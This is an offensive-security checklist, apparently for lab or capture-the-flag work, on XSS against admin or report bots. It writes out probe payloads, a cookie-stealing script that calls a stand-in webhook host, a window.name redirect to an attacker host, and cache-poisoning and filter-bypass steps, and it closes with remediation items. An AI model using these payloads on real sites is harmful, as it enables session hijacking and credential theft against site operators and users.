# Admin Bot XSS Recon Checklist

## Goal

Find reflected/stored XSS that executes in an admin or support bot session and exfiltrate privileged data with minimal proof.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Bot/report feature:
```

## 2. Map Reflection And Bot Features

Look for:

- repeated phrases / transcription / preview text
- search or echo parameters
- report URL / send to admin / share with moderator forms
- support preview or link checker endpoints

Record:

```text
Reflected parameter/field:
Bot endpoint:
Bot URL restrictions:
Same-origin required: yes/no
```

## 3. Identify Output Context

Fetch a normal value and a markup probe:

```bash
curl -sS -G "https://[host]/" --data-urlencode "q=test"
curl -sS -G "https://[host]/" --data-urlencode "q=<b>test</b>"
curl -sS -G "https://[host]/" --data-urlencode "q=<img src=x onerror=alert(1)>"
```

Record:

```text
Context: HTML text / attribute / JS / URL
Encoded: yes/no
Working tags/handlers:
CSP present: yes/no
```

## 4. Test Bot URL Policy

```bash
curl -sS -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[host]/?q=test"}'
```

Also test:

```text
external domain
127.0.0.1
path outside allowlist
http vs https
```

Record:

```text
Accepted URL pattern:
Rejected URL pattern:
Useful error text:
```

## 4b. Worker Eval + SW Cache Poison (when present)

If the app uses a dedicated Worker and a Service Worker Cache API:

- [ ] Find Worker sinks: `eval`, `Function`, `setTimeout(string)` on path/message data
- [ ] Read `sw.js` for cache name and cache-first static scripts
- [ ] Prove Cache API `put` from worker/page changes what `fetch('/static/...')` returns
- [ ] Test whether **separate bot visits** share a browser profile (often they do not)
- [ ] If external report URLs are allowed: iframe poison URL → wait → `location.replace(lab)` in one visit
- [ ] Prefer sync main-thread exfil (`location.replace(oast+data)`) over async `fetch` against fast bot teardown

See: `notes/worker-eval-sw-cache-poison.md`, `payloads/xss/worker-eval-sw-cache-poison-bot.md`

## 4c. HTML Allowlist + Rare Event Handlers (when present)

If profile/bio fields claim an allowlist or keep some raw tags:

- [ ] Map per-field behavior (escape vs strip vs keep)
- [ ] Enumerate kept tags (`<body>`, `<b>`, `<a>`, …)
- [ ] Fuzz uncommon `on*` attrs — especially `onhashchange` if a hashchange stub exists
- [ ] Do not stop at the visible `addEventListener('hashchange')` (often a red herring)
- [ ] If handler needs a hash change: host an opener (`window.open` + set hash); framing may be blocked
- [ ] Prefer external ticket URLs when the bot accepts them

See: `notes/html-allowlist-body-onhashchange-xss.md`, `payloads/xss/body-onhashchange-allowlist-bot.md`

## 5. Build Same-Origin XSS URL

Start with simple proof:

```html
<img src=x onerror=alert(1)>
<script>alert(1)</script>
<svg/onload=alert(1)>
```

Then move to exfil:

```html
<script>fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))</script>
```

Record:

```text
Final payload:
Final URL:
Execution confirmed locally: yes/no
```

## 6. Exfiltrate Minimal Impact Data

Preferred order:

1. `document.cookie`
2. admin-only fetch/XHR to known endpoints
3. DOM content visible only to admin
4. screenshot or secondary callbacks only if needed

Use a disposable webhook/collaborator outside reusable notes.

If filters block normal concat or URL-building syntax, test whether a tiny attacker page plus `window.name` can reduce the payload to:

```text
";name=document.cookie;location='//[attacker-host]'//
```

Then let the attacker page convert `window.name` into a server-side log request.

Record:

```text
Exfil method:
Data received:
Redacted summary:
```

## 7. Check Cookie And CSP Limits

Determine whether failure is due to:

- `HttpOnly` cookies
- CSP blocking inline script
- bot timeout
- malformed report URL
- `postMessage` validation using string coercion while the sink reuses a non-string object
- `window.name` not surviving navigation in the real bot runtime
- attacker host propagation/cache issues returning stale content or `404`

If cookies are HttpOnly, pivot to in-browser fetch of admin-only routes.

Record:

```text
HttpOnly likely: yes/no
CSP bypass needed: yes/no
Fallback path:
```

## 8. Confirm Root Cause

Separate issues clearly:

```text
Reflected input reached HTML unsafely.
Admin bot visited attacker-controlled same-origin page.
Sensitive cookie was readable from JavaScript.
```

## 9. Fix Checklist

- Encode reflected output by context.
- Use safe rendering APIs.
- Set HttpOnly on sensitive cookies.
- Restrict bot browsing and isolate bot sessions.
- Add CSP and bot/report regression tests.

## 10. Decision Checklist

- [ ] Reflection point identified.
- [ ] HTML execution confirmed.
- [ ] Bot/report URL policy understood.
- [ ] Same-origin XSS URL built.
- [ ] Admin bot triggered successfully.
- [ ] Sensitive data exfiltrated with minimal proof.
- [ ] If using helper infrastructure, the attacker host was fresh and confirmed live before submission.
- [ ] If the target uses `postMessage`, object/array overload confusion was tested in addition to plain-string origin spoofing.
- [ ] Root cause and impact documented.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
